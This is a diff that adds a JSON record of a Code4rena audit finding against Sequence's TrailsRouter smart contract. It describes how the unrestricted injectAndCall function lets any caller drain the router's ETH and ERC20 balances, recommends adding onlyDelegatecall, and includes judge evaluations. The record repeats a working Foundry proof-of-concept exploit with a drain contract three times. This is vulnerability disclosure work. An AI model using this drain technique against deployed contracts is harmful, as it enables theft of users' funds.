@@ -1,0 +1,108 @@
+{
+  "pairing": {
+    "match_status": "exact_submission",
+    "project": "Sequence_ Transaction Rails_Yn6A3eYizcQ",
+    "audit_uid": "Yn6A3eYizcQ",
+    "requested_submission_uid": "daRnMoZA8gY",
+    "requested_finding_uid": "7rSTe38xKPK",
+    "source_kind": "pipeline_findings",
+    "source_path": "/root/sc_slicer_standalone/c4_pipeline_output/Sequence_Transaction_Rails_Yn6A3eYizcQ/20260618_145131/findings.json",
+    "source_submission_uid": "daRnMoZA8gY",
+    "source_finding_uid": "7rSTe38xKPK",
+    "original_report_path": "Sequence_ Transaction Rails_Yn6A3eYizcQ\\low_valid_daRnMoZA8gY.json",
+    "note": "The report is the exact submission paired with this contract."
+  },
+  "submission_uid": "daRnMoZA8gY",
+  "finding_uid": "7rSTe38xKPK",
+  "finding_number": "75",
+  "title": "Public `injectAndCall` enables unauthorized draining of router-held ETH/ERC20 balances",
+  "severity": "medium",
+  "validity": "valid",
+  "quality": "",
+  "user_handle": "Incogknito",
+  "body": "## Finding description and impact\n\nThe `injectAndCall` function is public and not restricted by `onlyDelegatecall`, despite being designed for delegatecall usage. It reads `callerBalance = _getSelfBalance(token)`, then:\n- For ETH: calls `target.call{value: callerBalance}(callData)`, sending the router’s entire ETH balance to `target`.\n- For ERC20: does `SafeERC20.forceApprove(token, target, callerBalance)` and then `target.call(callData)`, enabling `target` to `transferFrom(router, ...)` up to the router’s entire token balance.\n\nAnyone can call `injectAndCall` directly and:\n- For ETH: set `target = attackerEOA` (or any contract able to receive ETH) and drain all ETH held by the router.\n- For ERC20: set `target = attackerContract` that, upon being called, executes `transferFrom(router, attacker, balance)` using the freshly granted allowance.\n\nThus, any ETH or ERC20s held by the router can be stolen by any external caller through `injectAndCall`, without authorization.\n\n## Recommended mitigation steps\n\nAdd `onlyDelegatecall` to the function signature",
+  "proof_of_concept": "```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.30;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {TrailsRouter} from \"src/TrailsRouter.sol\";\nimport {MockERC20} from \"test/mocks/MockERC20.sol\";\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\ncontract ERC20DrainTarget {\n    function drainAll(address token, address to) external {\n        uint256 bal = IERC20(token).balanceOf(msg.sender);\n        require(IERC20(token).transferFrom(msg.sender, to, bal), \"transferFrom failed\");\n    }\n\n    receive() external payable {}\n}\n\ncontract TrailsRouterInjectAndCallPublicDrainPoC is Test {\n    TrailsRouter internal router;\n    MockERC20 internal token;\n    ERC20DrainTarget internal drainTarget;\n    address payable internal thief;\n\n    function setUp() public {\n        router = new TrailsRouter();\n        token = new MockERC20(\"Mock\", \"MCK\", 18);\n        drainTarget = new ERC20DrainTarget();\n        thief = payable(makeAddr(\"thief\"));\n    }\n\n    function test_PoC_injectAndCall_public_drain_ETH() public {\n        // Arrange: Fund router with ETH (stranded balance on router)\n        vm.deal(address(this), 2 ether);\n        (bool ok,) = address(router).call{value: 1 ether}(\"\");\n        require(ok, \"fund router failed\");\n        assertEq(address(router).balance, 1 ether);\n\n        // Act: Anyone can drain router ETH via public injectAndCall to an arbitrary target (EOA)\n        uint256 thiefBefore = thief.balance;\n        router.injectAndCall(address(0), thief, \"\", 0, bytes32(0));\n\n        // Assert: Router drained, thief received ETH\n        assertEq(address(router).balance, 0, \"router eth not drained\");\n        assertEq(thief.balance - thiefBefore, 1 ether, \"thief did not receive eth\");\n    }\n\n    function test_PoC_injectAndCall_public_drain_ERC20() public {\n        // Arrange: Router holds ERC20 (stranded balance on router)\n        uint256 amount = 1_000e18;\n        token.mint(address(router), amount);\n        assertEq(token.balanceOf(address(router)), amount);\n\n        // Act: Anyone can force-approve target, then target drains router via transferFrom\n        router.injectAndCall(\n            address(token),\n            address(drainTarget),\n            abi.encodeWithSelector(drainTarget.drainAll.selector, address(token), thief),\n            0,\n            bytes32(0)\n        );\n\n        // Assert: Router drained, thief received tokens\n        assertEq(token.balanceOf(address(router)), 0, \"router token not drained\");\n        assertEq(token.balanceOf(thief), amount, \"thief did not receive tokens\");\n    }\n}\n```",
+  "lines_of_code": [
+    "https://github.com/code-423n4/2025-11-sequence/blob/593987c2b569f3212d2cadb31fc8d14b84bc30a9/src/TrailsRouter.sol#L129-L147"
+  ],
+  "source_record": {
+    "project_id": "Yn6A3eYizcQ",
+    "submission_index": "330",
+    "api_submission_id": "",
+    "uid": "daRnMoZA8gY",
+    "number": "330",
+    "title": "Public `injectAndCall` enables unauthorized draining of router-held ETH/ERC20 balances",
+    "severity": "medium",
+    "validity": "valid",
+    "quality": "",
+    "handle": "Incogknito",
+    "lines_of_code": [
+      "https://github.com/code-423n4/2025-11-sequence/blob/593987c2b569f3212d2cadb31fc8d14b84bc30a9/src/TrailsRouter.sol#L129-L147"
+    ],
+    "body": "## Finding description and impact\n\nThe `injectAndCall` function is public and not restricted by `onlyDelegatecall`, despite being designed for delegatecall usage. It reads `callerBalance = _getSelfBalance(token)`, then:\n- For ETH: calls `target.call{value: callerBalance}(callData)`, sending the router’s entire ETH balance to `target`.\n- For ERC20: does `SafeERC20.forceApprove(token, target, callerBalance)` and then `target.call(callData)`, enabling `target` to `transferFrom(router, ...)` up to the router’s entire token balance.\n\nAnyone can call `injectAndCall` directly and:\n- For ETH: set `target = attackerEOA` (or any contract able to receive ETH) and drain all ETH held by the router.\n- For ERC20: set `target = attackerContract` that, upon being called, executes `transferFrom(router, attacker, balance)` using the freshly granted allowance.\n\nThus, any ETH or ERC20s held by the router can be stolen by any external caller through `injectAndCall`, without authorization.\n\n## Recommended mitigation steps\n\nAdd `onlyDelegatecall` to the function signature",
+    "proof_of_concept": "```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.30;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {TrailsRouter} from \"src/TrailsRouter.sol\";\nimport {MockERC20} from \"test/mocks/MockERC20.sol\";\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\ncontract ERC20DrainTarget {\n    function drainAll(address token, address to) external {\n        uint256 bal = IERC20(token).balanceOf(msg.sender);\n        require(IERC20(token).transferFrom(msg.sender, to, bal), \"transferFrom failed\");\n    }\n\n    receive() external payable {}\n}\n\ncontract TrailsRouterInjectAndCallPublicDrainPoC is Test {\n    TrailsRouter internal router;\n    MockERC20 internal token;\n    ERC20DrainTarget internal drainTarget;\n    address payable internal thief;\n\n    function setUp() public {\n        router = new TrailsRouter();\n        token = new MockERC20(\"Mock\", \"MCK\", 18);\n        drainTarget = new ERC20DrainTarget();\n        thief = payable(makeAddr(\"thief\"));\n    }\n\n    function test_PoC_injectAndCall_public_drain_ETH() public {\n        // Arrange: Fund router with ETH (stranded balance on router)\n        vm.deal(address(this), 2 ether);\n        (bool ok,) = address(router).call{value: 1 ether}(\"\");\n        require(ok, \"fund router failed\");\n        assertEq(address(router).balance, 1 ether);\n\n        // Act: Anyone can drain router ETH via public injectAndCall to an arbitrary target (EOA)\n        uint256 thiefBefore = thief.balance;\n        router.injectAndCall(address(0), thief, \"\", 0, bytes32(0));\n\n        // Assert: Router drained, thief received ETH\n        assertEq(address(router).balance, 0, \"router eth not drained\");\n        assertEq(thief.balance - thiefBefore, 1 ether, \"thief did not receive eth\");\n    }\n\n    function test_PoC_injectAndCall_public_drain_ERC20() public {\n        // Arrange: Router holds ERC20 (stranded balance on router)\n        uint256 amount = 1_000e18;\n        token.mint(address(router), amount);\n        assertEq(token.balanceOf(address(router)), amount);\n\n        // Act: Anyone can force-approve target, then target drains router via transferFrom\n        router.injectAndCall(\n            address(token),\n            address(drainTarget),\n            abi.encodeWithSelector(drainTarget.drainAll.selector, address(token), thief),\n            0,\n            bytes32(0)\n        );\n\n        // Assert: Router drained, thief received tokens\n        assertEq(token.balanceOf(address(router)), 0, \"router token not drained\");\n        assertEq(token.balanceOf(thief), amount, \"thief did not receive tokens\");\n    }\n}\n```",
+    "detail_url": "https://code4rena.com/api/v1/audits/Yn6A3eYizcQ/submissions/330",
+    "raw": {
+      "auditUid": "Yn6A3eYizcQ",
+      "createdAt": "2025-11-16T07:51:55.913Z",
+      "deletedAt": null,
+      "evaluations": [
+        {
+          "uid": "gLcftRTm5KB",
+          "userUid": "FtdUe6YkFxN",
+          "userAuditRole": "judge",
+          "createdAt": "2025-11-17T15:26:57.031Z",
+          "type": "validity",
+          "value": "valid",
+          "submissionUid": null,
+          "findingUid": "7rSTe38xKPK"
+        },
+        {
+          "uid": "h5ukgr9L8vQ",
+          "userUid": "FtdUe6YkFxN",
+          "userAuditRole": "judge",
+          "createdAt": "2025-11-19T09:58:07.091Z",
+          "type": "severity",
+          "value": "low",
+          "submissionUid": null,
+          "findingUid": "7rSTe38xKPK"
+        }
+      ],
+      "finding": {
+        "uid": "7rSTe38xKPK",
+        "number": 75,
+        "duplicates": 71
+      },
+      "isPrimary": false,
+      "latestEvaluations": {
+        "credit": null,
+        "mitigationStatus": null,
+        "quality": null,
+        "rank": null,
+        "severity": "low",
+        "validity": "valid",
+        "updatedAt": "2025-11-25T16:51:37.665Z"
+      },
+      "mitigationOf": null,
+      "mitigationStatus": null,
+      "severity": "medium",
+      "team": null,
+      "title": "Public `injectAndCall` enables unauthorized draining of router-held ETH/ERC20 balances",
+      "uid": "daRnMoZA8gY",
+      "updatedAt": "2025-11-16T07:51:55.913Z",
+      "user": {
+        "uid": "CZ69m5q2Qct",
+        "handle": "Incogknito"
+      },
+      "sensitivity": "non-sensitive",
+      "aiSeverity": null,
+      "aiValidity": null,
+      "body": "## Finding description and impact\n\nThe `injectAndCall` function is public and not restricted by `onlyDelegatecall`, despite being designed for delegatecall usage. It reads `callerBalance = _getSelfBalance(token)`, then:\n- For ETH: calls `target.call{value: callerBalance}(callData)`, sending the router’s entire ETH balance to `target`.\n- For ERC20: does `SafeERC20.forceApprove(token, target, callerBalance)` and then `target.call(callData)`, enabling `target` to `transferFrom(router, ...)` up to the router’s entire token balance.\n\nAnyone can call `injectAndCall` directly and:\n- For ETH: set `target = attackerEOA` (or any contract able to receive ETH) and drain all ETH held by the router.\n- For ERC20: set `target = attackerContract` that, upon being called, executes `transferFrom(router, attacker, balance)` using the freshly granted allowance.\n\nThus, any ETH or ERC20s held by the router can be stolen by any external caller through `injectAndCall`, without authorization.\n\n## Recommended mitigation steps\n\nAdd `onlyDelegatecall` to the function signature",
+      "proofOfConcept": "```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.30;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {TrailsRouter} from \"src/TrailsRouter.sol\";\nimport {MockERC20} from \"test/mocks/MockERC20.sol\";\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\ncontract ERC20DrainTarget {\n    function drainAll(address token, address to) external {\n        uint256 bal = IERC20(token).balanceOf(msg.sender);\n        require(IERC20(token).transferFrom(msg.sender, to, bal), \"transferFrom failed\");\n    }\n\n    receive() external payable {}\n}\n\ncontract TrailsRouterInjectAndCallPublicDrainPoC is Test {\n    TrailsRouter internal router;\n    MockERC20 internal token;\n    ERC20DrainTarget internal drainTarget;\n    address payable internal thief;\n\n    function setUp() public {\n        router = new TrailsRouter();\n        token = new MockERC20(\"Mock\", \"MCK\", 18);\n        drainTarget = new ERC20DrainTarget();\n        thief = payable(makeAddr(\"thief\"));\n    }\n\n    function test_PoC_injectAndCall_public_drain_ETH() public {\n        // Arrange: Fund router with ETH (stranded balance on router)\n        vm.deal(address(this), 2 ether);\n        (bool ok,) = address(router).call{value: 1 ether}(\"\");\n        require(ok, \"fund router failed\");\n        assertEq(address(router).balance, 1 ether);\n\n        // Act: Anyone can drain router ETH via public injectAndCall to an arbitrary target (EOA)\n        uint256 thiefBefore = thief.balance;\n        router.injectAndCall(address(0), thief, \"\", 0, bytes32(0));\n\n        // Assert: Router drained, thief received ETH\n        assertEq(address(router).balance, 0, \"router eth not drained\");\n        assertEq(thief.balance - thiefBefore, 1 ether, \"thief did not receive eth\");\n    }\n\n    function test_PoC_injectAndCall_public_drain_ERC20() public {\n        // Arrange: Router holds ERC20 (stranded balance on router)\n        uint256 amount = 1_000e18;\n        token.mint(address(router), amount);\n        assertEq(token.balanceOf(address(router)), amount);\n\n        // Act: Anyone can force-approve target, then target drains router via transferFrom\n        router.injectAndCall(\n            address(token),\n            address(drainTarget),\n            abi.encodeWithSelector(drainTarget.drainAll.selector, address(token), thief),\n            0,\n            bytes32(0)\n        );\n\n        // Assert: Router drained, thief received tokens\n        assertEq(token.balanceOf(address(router)), 0, \"router token not drained\");\n        assertEq(token.balanceOf(thief), amount, \"thief did not receive tokens\");\n    }\n}\n```",
+      "linesOfCode": "https://github.com/code-423n4/2025-11-sequence/blob/593987c2b569f3212d2cadb31fc8d14b84bc30a9/src/TrailsRouter.sol#L129-L147",
+      "number": 330,
+      "aiExplanation": null,
+      "_index": 330
+    }
+  }
+}
